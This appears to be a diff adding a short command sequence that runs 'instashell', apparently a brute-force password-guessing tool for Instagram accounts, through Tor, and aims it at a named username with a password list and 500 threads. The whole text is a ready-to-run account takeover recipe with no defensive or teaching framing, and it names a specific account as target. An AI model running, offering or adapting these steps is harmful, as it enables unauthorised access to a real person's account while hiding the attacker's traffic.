@@ -1,0 +1,7 @@
+cd instashell/
+chmod +x ./instashell.sh
+service tor start
+./instashell.sh
+Username account: shrey_asharma21
+Password List: /root/pass.txt
+Threads:  500
